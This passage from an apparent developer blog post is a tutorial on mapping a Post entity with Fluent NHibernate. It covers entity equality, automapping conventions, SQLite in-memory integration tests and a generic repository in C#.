New\"><div style=\"FONT-WEIGHT: bold; FONT-SIZE: 10pt; BACKGROUND: black; COLOR: white; FONT-FAMILY: Courier New\"><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">public</span><span style=\"COLOR: #cc7832\">abstract</span><span style=\"COLOR: #cc7832\">class</span><span style=\"COLOR: #ffc66d\">Entity</span>:<span style=\"COLOR: #6897bb\">IEquatable</span><span style=\"FONT-WEIGHT: normal\">&lt;</span><span style=\"COLOR: #ffc66d\">Entity</span><span style=\"FONT-WEIGHT: normal\">&gt;</span></p><p style=\"MARGIN: 0px\">{</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">private</span><span style=\"COLOR: #cc7832\">int</span>id;</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">private</span><span style=\"COLOR: #cc7832\">int</span>transientHashCode;</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">public</span><span style=\"COLOR: #cc7832\">virtual</span><span style=\"COLOR: #cc7832\">int</span>Id {<span style=\"COLOR: #cc7832\">get</span>{<span style=\"COLOR: #cc7832\">return</span>id; } }</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">public</span><span style=\"COLOR: #cc7832\">override</span><span style=\"COLOR: #cc7832\">bool</span>Equals(<span style=\"COLOR: #cc7832\">object</span>obj)</p><p style=\"MARGIN: 0px\">{</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">return</span>Equals(obj<span style=\"COLOR: #cc7832\">as</span><span style=\"COLOR: #ffc66d\">Entity</span>);</p><p style=\"MARGIN: 0px\">}</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">public</span><span style=\"COLOR: #cc7832\">virtual</span><span style=\"COLOR: #cc7832\">bool</span>Equals(<span style=\"COLOR: #ffc66d\">Entity</span>obj)</p><p style=\"MARGIN: 0px\">{</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">if</span>(obj ==<span style=\"COLOR: #cc7832\">null</span>)<span style=\"COLOR: #cc7832\">return</span><span style=\"COLOR: #cc7832\">false</span>;</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">if</span>(IsTransient)</p><p style=\"MARGIN: 0px\">{</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">return</span>ReferenceEquals(<span style=\"COLOR: #cc7832\">this</span>, obj);</p><p style=\"MARGIN: 0px\">}</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">return</span>obj.Id == Id&& obj.GetType() == GetType();</p><p style=\"MARGIN: 0px\">}</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">public</span><span style=\"COLOR: #cc7832\">override</span><span style=\"COLOR: #cc7832\">int</span>GetHashCode()</p><p style=\"MARGIN: 0px\">{</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">if</span>(IsTransient)</p><p style=\"MARGIN: 0px\">{</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">if</span>(transientHashCode ==<span style=\"COLOR: #6897bb\">0</span>)</p><p style=\"MARGIN: 0px\">{</p><p style=\"MARGIN: 0px\">transientHashCode =<span style=\"COLOR: #cc7832\">base</span><span style=\"FONT-WEIGHT: normal\">.GetHashCode();</span></p><p style=\"MARGIN: 0px\">}</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">return</span>transientHashCode;</p><p style=\"MARGIN: 0px\">}</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">return</span>id;</p><p style=\"MARGIN: 0px\">}</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">private</span><span style=\"COLOR: #cc7832\">bool</span>IsTransient</p><p style=\"MARGIN: 0px\">{</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">get</span>{<span style=\"COLOR: #cc7832\">return</span>Id ==<span style=\"COLOR: #6897bb\">0</span>; }</p><p style=\"MARGIN: 0px\">}</p><p style=\"MARGIN: 0px\">}<!--EndFragment--></p></div></div><p></p><p>For more information about why insuring that your entity equality is in order, please see<a target=\"_blank\" href=\"http://blogs.hibernatingrhinos.com/nhibernate/archive/2008/04/04/identity-field-equality-and-hash-code.aspx\">The NHibernate FAQ</a>.</p><p>As this is a blog example, we will need a class to represent posts.</p><h3>The Post Class</h3><div style=\"FONT-WEIGHT: bold; FONT-SIZE: 10pt; BACKGROUND: black; COLOR: white; FONT-FAMILY: Courier New\"><div style=\"FONT-WEIGHT: bold; FONT-SIZE: 10pt; BACKGROUND: black; COLOR: white; FONT-FAMILY: Courier New\"><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">public</span><span style=\"COLOR: #cc7832\">class</span><span style=\"COLOR: #ffc66d\">Post</span>:<span style=\"COLOR: #ffc66d\">Entity</span>,<span style=\"COLOR: #6897bb\">IEquatable</span><span style=\"FONT-WEIGHT: normal\">&lt;</span><span style=\"COLOR: #ffc66d\">Post</span><span style=\"FONT-WEIGHT: normal\">&gt;</span></p><p style=\"MARGIN: 0px\">{</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">public</span><span style=\"COLOR: #cc7832\">virtual</span><span style=\"COLOR: #cc7832\">string</span>Title {<span style=\"COLOR: #cc7832\">get</span>;<span style=\"COLOR: #cc7832\">set</span>; }</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">public</span><span style=\"COLOR: #cc7832\">virtual</span><span style=\"COLOR: #cc7832\">string</span>Body {<span style=\"COLOR: #cc7832\">get</span>;<span style=\"COLOR: #cc7832\">set</span>; }</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\"></span><span style=\"COLOR: gray\">&lt;summary&gt;</span></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\">Indicates whether the current object is equal to another object of the same type.</span></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\"></span><span style=\"COLOR: gray\">&lt;/summary&gt;</span></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\"></span><span style=\"COLOR: gray\">&lt;returns&gt;</span></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\">true if the current object is equal to the</span><span style=\"COLOR: gray\">&lt;paramref name=\"other\" /&gt;</span><span style=\"COLOR: green\">parameter; otherwise, false.</span></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\"></span><span style=\"COLOR: gray\">&lt;/returns&gt;</span></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\"></span><span style=\"COLOR: gray\">&lt;param name=\"other\"&gt;</span></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\">An object to compare with this object.</span></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\"></span><span style=\"COLOR: gray\">&lt;/param&gt;</span></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">public</span><span style=\"COLOR: #cc7832\">virtual</span><span style=\"COLOR: #cc7832\">bool</span>Equals(<span style=\"COLOR: #ffc66d\">Post</span>other)</p><p style=\"MARGIN: 0px\">{</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">return</span><span style=\"COLOR: #cc7832\">base</span><span style=\"FONT-WEIGHT: normal\">.Equals(other);</span></p><p style=\"MARGIN: 0px\">}</p><p style=\"MARGIN: 0px\">}<!--EndFragment--></p></div></div><p></p><p>In the future, we will add other properties like a collection of comments.  For now, we will keep it simple in order to demonstrate the fluent mapping.</p><h3>What's the Deal with the Virtual Members</h3><p>NHibernate makes use of proxies for advanced features like lazy loading.  The default proxy factory uses<a target=\"_blank\" href=\"http://www.castleproject.org/dynamicproxy/index.html\">Castle's DynamicProxy</a>.  DyanmicProxy generates inheritance based proxies; therefore, it can only work if members are marked as virtual so that it can override them.  There are other proxy choices; however, I will not be covering them.  Making members virtual is a small price to pay for the conveniance in my opinion.</p><h3>Mapping the Post Entity to the Database</h3><p>Generating the mappings for your entities could not be easier with fluent nhibernates automapper.</p><p>Here is a simple utitliy class to add to the Service project:</p><div style=\"FONT-WEIGHT: bold; FONT-SIZE: 10pt; BACKGROUND: black; COLOR: white; FONT-FAMILY: Courier New\"><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">public</span><span style=\"COLOR: #cc7832\">class</span><span style=\"COLOR: #ffc66d\">DomainMapper</span></p><p style=\"MARGIN: 0px\">{</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">private</span><span style=\"COLOR: #cc7832\">readonly</span><span style=\"COLOR: #6897bb\">IPersistenceConfigurer</span>persistenceConfigurer;</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">public</span>DomainMapper(<span style=\"COLOR: #6897bb\">IPersistenceConfigurer</span>persistenceConfigurer)</p><p style=\"MARGIN: 0px\">{</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">this</span><span style=\"FONT-WEIGHT: normal\">.persistenceConfigurer = persistenceConfigurer;</span></p><p style=\"MARGIN: 0px\">}</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">public</span><span style=\"COLOR: #cc7832\">void</span>Configure(<span style=\"COLOR: #ffc66d\">Configuration</span>configuration)</p><p style=\"MARGIN: 0px\">{</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #ffc66d\">Fluently</span><span style=\"FONT-WEIGHT: normal\">.Configure(configuration).Mappings(mapping =&gt; mapping.AutoMappings.Add(GetMapper())).Database(</span></p><p style=\"MARGIN: 0px\">persistenceConfigurer).BuildSessionFactory();</p><p style=\"MARGIN: 0px\">}</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">protected</span><span style=\"COLOR: #cc7832\">virtual</span><span style=\"COLOR: #ffc66d\">AutoPersistenceModel</span>GetMapper()</p><p style=\"MARGIN: 0px\">{</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">var</span>persistenceModel =<span style=\"COLOR: #cc7832\">new</span><span style=\"COLOR: #ffc66d\">AutoPersistenceModel</span>(<span style=\"COLOR: #cc7832\">typeof</span>(<span style=\"COLOR: #ffc66d\">Entity</span>).Assembly)</p><p style=\"MARGIN: 0px\">.Where(type =&gt; !type.IsAbstract&&<span style=\"COLOR: #cc7832\">typeof</span>(<span style=\"COLOR: #ffc66d\">Entity</span>).IsAssignableFrom(type))</p><p style=\"MARGIN: 0px\">.WithConvention(convention =&gt;</p><p style=\"MARGIN: 0px\">{</p><p style=\"MARGIN: 0px\">convention.IdConvention =</p><p style=\"MARGIN: 0px\">id =&gt; id.Access.AsReadOnlyPropertyThroughCamelCaseField().GeneratedBy.HiLo(<span style=\"COLOR: #6897bb\">100</span><span style=\"FONT-WEIGHT: normal\">.ToString());</span></p><p style=\"MARGIN: 0px\">convention.IsBaseType = type =&gt; type ==<span style=\"COLOR: #cc7832\">typeof</span>(<span style=\"COLOR: #ffc66d\">Entity</span>);</p><p style=\"MARGIN: 0px\">convention.DefaultStringLength =<span style=\"COLOR: #6897bb\">255</span>;</p><p style=\"MARGIN: 0px\">});</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">return</span>persistenceModel;</p><p style=\"MARGIN: 0px\">}</p><p style=\"MARGIN: 0px\">}</p></div><p></p><p>I like to use HiLo for the id convention and avoid using Native Identity.  For more information about the identity generators available using NHibernate, please see<a href=\"http://vadivelk.net/archive/2008/11/06/primary-key-generators-in-nhibernate.aspx\">Vadi's Rants</a>.</p><p>The DefaultStringLength is just a personal preference.  The default is 100 if you do not specify a convention.</p><p>The IsBaseType is necesarry so fluent nhibernate does not create joined table entities from everything that inherits from Entity.</p><p>In the Blog.Service.Test project, add this utility class:</p><div style=\"FONT-WEIGHT: bold; FONT-SIZE: 10pt; BACKGROUND: black; COLOR: white; FONT-FAMILY: Courier New\"><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">public</span><span style=\"COLOR: #cc7832\">class</span><span style=\"COLOR: #ffc66d\">TestDomainMapper</span>:<span style=\"COLOR: #ffc66d\">DomainMapper</span></p><p style=\"MARGIN: 0px\">{</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">public</span>TestDomainMapper() :<span style=\"COLOR: #cc7832\">base</span>(<span style=\"COLOR: #ffc66d\">SQLiteConfiguration</span><span style=\"FONT-WEIGHT: normal\">.Standard.InMemory().ShowSql())</span></p><p style=\"MARGIN: 0px\">{</p><p style=\"MARGIN: 0px\">}</p><p style=\"MARGIN: 0px\">}</p></div><p></p><p>This class simply inerits from DomainMapper and provides a SQLite in memory database as the persistence configuration.  Using an in memory database for our tests will make them run much faster.  As the project grows, it is advisable to also run your integration tests vs the actual database that you will be using; however, running them against an in memory database during standard development saves time and is very conveniant.</p><p>In my first post, I attempted to make a thorough list of the tools that would be used in the project.  I neglected at least one though: SQLite.  I may have neglected more, so do not be surprised if we have to add more binaries throughout the series to our libraries directory.  System.Data.SQLite can be downloaded<a href=\"http://sqlite.phxsoftware.com/\">here</a>.  Add it to<strong>trunk/libraries/sqlite</strong>and reference it from the Blog.Service.Test project.</p><p>Fluent NHibernate provides a useful helper for integration tests: PersistenceSpecification&lt;T&gt;.  Here is what the initial Post integration test looks like:</p><div style=\"FONT-WEIGHT: bold; FONT-SIZE: 10pt; BACKGROUND: black; COLOR: white; FONT-FAMILY: Courier New\"><p style=\"MARGIN: 0px\">[<span style=\"COLOR: #ffc66d\">TestFixture</span>]</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">public</span><span style=\"COLOR: #cc7832\">class</span><span style=\"COLOR: #ffc66d\">MappingIntegrationContext</span></p><p style=\"MARGIN: 0px\">{</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">protected</span><span style=\"COLOR: #6897bb\">ISession</span>Session {<span style=\"COLOR: #cc7832\">get</span>;<span style=\"COLOR: #cc7832\">private</span><span style=\"COLOR: #cc7832\">set</span>; }</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\">[<span style=\"COLOR: #ffc66d\">SetUp</span>]</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">public</span><span style=\"COLOR: #cc7832\">void</span>BeforeEachTest()</p><p style=\"MARGIN: 0px\">{</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">var</span>configuration =<span style=\"COLOR: #cc7832\">new</span><span style=\"COLOR: #ffc66d\">Configuration</span>();</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">new</span><span style=\"COLOR: #ffc66d\">TestDomainMapper</span>().Configure(configuration);</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">var</span>sessionFactory = configuration.BuildSessionFactory();</p><p style=\"MARGIN: 0px\">Session = sessionFactory.OpenSession();</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #6897bb\">IDbConnection</span>connection = Session.Connection;</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">string</span>[] scripts = configuration.GenerateSchemaCreationScript(<span style=\"COLOR: #ffc66d\">Dialect</span><span style=\"FONT-WEIGHT: normal\">.GetDialect(configuration.Properties));</span></p><p style=\"MARGIN: 0px\">scripts.ToList().ForEach(script =&gt;</p><p style=\"MARGIN: 0px\">{</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">var</span>cmd = connection.CreateCommand();</p><p style=\"MARGIN: 0px\">cmd.CommandText = script;</p><p style=\"MARGIN: 0px\">cmd.ExecuteNonQuery();</p><p style=\"MARGIN: 0px\">});</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\">Session.Flush();</p><p style=\"MARGIN: 0px\">}</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\">[<span style=\"COLOR: #ffc66d\">Test</span>]</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">public</span><span style=\"COLOR: #cc7832\">void</span>PostIntegrationTest()</p><p style=\"MARGIN: 0px\">{</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">new</span><span style=\"COLOR: #ffc66d\">PersistenceSpecification</span><span style=\"FONT-WEIGHT: normal\">&lt;</span><span style=\"COLOR: #ffc66d\">Post</span><span style=\"FONT-WEIGHT: normal\">&gt;(Session)</span></p><p style=\"MARGIN: 0px\">.CheckProperty(x =&gt; x.Title,<span style=\"COLOR: #a5c25c\">\"A Test Post\"</span>)</p><p style=\"MARGIN: 0px\">.CheckProperty(x =&gt; x.Body,<span style=\"COLOR: #a5c25c\">\"This is where the content of my post will be.  Yay.\"</span>)</p><p style=\"MARGIN: 0px\">.VerifyTheMappings();</p><p style=\"MARGIN: 0px\">}</p><p style=\"MARGIN: 0px\">}</p></div><p></p><p>This is a good start, but obviously as our domain model grows and we need more test classes, this SetUp can be abstracted into its own base class that other test classes can inherit from.</p><div style=\"FONT-WEIGHT: bold; FONT-SIZE: 10pt; BACKGROUND: black; COLOR: white; FONT-FAMILY: Courier New\"><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">public</span><span style=\"COLOR: #cc7832\">abstract</span><span style=\"COLOR: #cc7832\">class</span><span style=\"COLOR: #ffc66d\">FixtureBase</span></p><p style=\"MARGIN: 0px\">{</p><p style=\"MARGIN: 0px\">[<span style=\"COLOR: #ffc66d\">SetUp</span>]</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">public</span><span style=\"COLOR: #cc7832\">void</span>BeforeEachTest()</p><p style=\"MARGIN: 0px\">{</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">var</span>configuration =<span style=\"COLOR: #cc7832\">new</span><span style=\"COLOR: #ffc66d\">Configuration</span>();</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">new</span><span style=\"COLOR: #ffc66d\">TestDomainMapper</span>().Configure(configuration);</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">var</span>sessionFactory = configuration.BuildSessionFactory();</p><p style=\"MARGIN: 0px\">Session = sessionFactory.OpenSession();</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #6897bb\">IDbConnection</span>connection = Session.Connection;</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">string</span>[] scripts = configuration.GenerateSchemaCreationScript(<span style=\"COLOR: #ffc66d\">Dialect</span><span style=\"FONT-WEIGHT: normal\">.GetDialect(configuration.Properties));</span></p><p style=\"MARGIN: 0px\">scripts.ToList().ForEach(script =&gt;</p><p style=\"MARGIN: 0px\">{</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">var</span>cmd = connection.CreateCommand();</p><p style=\"MARGIN: 0px\">cmd.CommandText = script;</p><p style=\"MARGIN: 0px\">cmd.ExecuteNonQuery();</p><p style=\"MARGIN: 0px\">});</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\">Session.Flush();</p><p style=\"MARGIN: 0px\">}</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">protected</span><span style=\"COLOR: #6897bb\">ISession</span>Session {<span style=\"COLOR: #cc7832\">get</span>;<span style=\"COLOR: #cc7832\">private</span><span style=\"COLOR: #cc7832\">set</span>; }</p><p style=\"MARGIN: 0px\">}</p></div><p></p><p>Now the noise of the SetUp method can be taken out of the MappingIntegrationContext and we have a reusable base class for future test classes.</p><h3>Implementing IRepository</h3><p>Next, we will implement our repository.  NHibernate.Burrow AppBlock makes this trivial.  Reference NHibernate.Burrow.AppBlock from the Blog.Service assembly.</p><div style=\"FONT-WEIGHT: bold; FONT-SIZE: 10pt; BACKGROUND: black; COLOR: white; FONT-FAMILY: Courier New\"><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">using</span>System.Collections.Generic;</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">using</span>Blog.Domain;</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">using</span>NHibernate.Burrow.AppBlock.DAOBases;</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">namespace</span>Blog.Service</p><p style=\"MARGIN: 0px\">{</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">public</span><span style=\"COLOR: #cc7832\">class</span><span style=\"COLOR: #ffc66d\">Repository</span><span style=\"FONT-WEIGHT: normal\">&lt;T&gt;:</span><span style=\"COLOR: #ffc66d\">GenericDAO</span><span style=\"FONT-WEIGHT: normal\">&lt;T&gt;,</span><span style=\"COLOR: #6897bb\">IRepository</span><span style=\"FONT-WEIGHT: normal\">&lt;T&gt;</span><span style=\"COLOR: #cc7832\">where</span>T :<span style=\"COLOR: #ffc66d\">Entity</span></p><p style=\"MARGIN: 0px\">{</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\"></span><span style=\"COLOR: gray\">&lt;summary&gt;</span></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\">Find an entity by unique identifier.</span></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\"></span><span style=\"COLOR: gray\">&lt;/summary&gt;</span></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\"></span><span style=\"COLOR: gray\">&lt;param name=\"id\"&gt;</span><span style=\"COLOR: green\">Unique identifier of the entity.</span><span style=\"COLOR: gray\">&lt;/param&gt;</span></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\"></span><span style=\"COLOR: gray\">&lt;returns&gt;</span><span style=\"COLOR: green\">Entity if found,</span><span style=\"COLOR: gray\">&lt;c&gt;</span><span style=\"COLOR: green\">null</span><span style=\"COLOR: gray\">&lt;/c&gt;</span><span style=\"COLOR: green\">otherwise.</span><span style=\"COLOR: gray\">&lt;/returns&gt;</span></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">public</span>T Find(<span style=\"COLOR: #cc7832\">int</span>id)</p><p style=\"MARGIN: 0px\">{</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">return</span><span style=\"COLOR: #cc7832\">base</span><span style=\"FONT-WEIGHT: normal\">.Get(id);</span></p><p style=\"MARGIN: 0px\">}</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\"></span><span style=\"COLOR: gray\">&lt;summary&gt;</span></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\">Find all entities.</span></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\"></span><span style=\"COLOR: gray\">&lt;/summary&gt;</span></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\"></span><span style=\"COLOR: gray\">&lt;returns&gt;</span><span style=\"COLOR: green\">Sequence of entities found.</span><span style=\"COLOR: gray\">&lt;/returns&gt;</span></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">public</span><span style=\"COLOR: #cc7832\">new</span><span style=\"COLOR: #6897bb\">IEnumerable</span><span style=\"FONT-WEIGHT: normal\">&lt;T&gt; FindAll()</span></p><p style=\"MARGIN: 0px\">{</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">return</span><span style=\"COLOR: #cc7832\">base</span><span style=\"FONT-WEIGHT: normal\">.FindAll();</span></p><p style=\"MARGIN: 0px\">}</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\"></span><span style=\"COLOR: gray\">&lt;summary&gt;</span></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\">Save (insert or update as appropriate)</span><span style=\"COLOR: gray\">&lt;paramref name=\"entity\"/&gt;</span><span style=\"COLOR: green\">on next commit of the unit of work.</span></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\"></span><span style=\"COLOR: gray\">&lt;/summary&gt;</span></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\"></span><span style=\"COLOR: gray\">&lt;param name=\"entity\"&gt;</span><span style=\"COLOR: green\">Entity to be saved.</span><span style=\"COLOR: gray\">&lt;/param&gt;</span></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">public</span><span style=\"COLOR: #cc7832\">new</span><span style=\"COLOR: #cc7832\">void</span>Save(T entity)</p><p style=\"MARGIN: 0px\">{</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">base</span><span style=\"FONT-WEIGHT: normal\">.Save(entity);</span></p><p style=\"MARGIN: 0px\">}</p><p style=\"MARGIN: 0px\"></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\"></span><span style=\"COLOR: gray\">&lt;summary&gt;</span></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\">Delete</span><span style=\"COLOR: gray\">&lt;paramref name=\"entity\"/&gt;</span><span style=\"COLOR: green\">on next commit of the unit of work.</span></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\"></span><span style=\"COLOR: gray\">&lt;/summary&gt;</span></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\"></span><span style=\"COLOR: gray\">&lt;param name=\"entity\"&gt;</span><span style=\"COLOR: green\">Entity to be deleted.</span><span style=\"COLOR: gray\">&lt;/param&gt;</span></p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">public</span><span style=\"COLOR: #cc7832\">new</span><span style=\"COLOR: #cc7832\">void</span>Delete(T entity)</p><p style=\"MARGIN: 0px\">{</p><p style=\"MARGIN: 0px\"><span style=\"COLOR: #cc7832\">base</span><span style=\"FONT-WEIGHT: normal\">.Delete(entity);</span></p><p style=\"MARGIN: 0px\">}</p><p style=\"MARGIN: 0px\">}</p><p style=\"MARGIN: 0px\">}</p></div><p></p><p>For the basic functionality, AppBlock provides everything that we need.</p><p><strong>Update</strong>: Some of you want the sample project that I am working from, so I will add a zip of it soon.</p><p>In the next post, we will wire up the Inversion of Control in our MVC app and create a controller for Post CRUD.</p><a href=\"http://www.dotnetkicks.com/kick/?url=http%3a%2f%2fnathan.whiteboard-it.com%2farchive%2f2009%2f03%2f06%2fasp.net-mvc-domain-driven-design-deux.aspx\"><img alt=\"kick it on DotNetKicks.com\" border=\"0\" src=\"http://www.dotnetkicks.com/Services/Images/KickItImageGenerator.ashx?url=http%3a%2f%2fnathan.whiteboard-it.com%2farchive%2f2009%2f03%2f06%2fasp.net-mvc-domain-driven-design-deux.aspx\" /></a><img src=\"http://nathan.whiteboard-it.com/aggbug/17.aspx\" width=\"1\" height=\"1\" /><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/PublicClassWheel?a=u2kx4CXr9Nc:0rHJfA6vj4I:tcjm6QUOmhc\"><img src=\"http://feeds.feedburner.com/~ff/PublicClassWheel?d=tcjm6QUOmhc\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/PublicClassWheel?a=u2kx4CXr9Nc:0rHJfA6vj4I:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/PublicClassWheel?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/PublicClassWheel?a=u2kx4CXr9Nc:0rHJfA6vj4I:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/PublicClassWheel?d=7Q72WNTAKBA\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/PublicClassWheel/~4/u2kx4CXr9Nc\" height=\"1\" width=\"1\"/>","author":"Nathan Stott","_id":{"$wrap":"$oid","v":1042}}
{"k":"0000000084","o":"0000017760","v":"001"}
{"_id":1043,"_uid":1043,"_dt":1373742602034,"_s":"67d3d2cf489fc0b202597f7477f07809"}
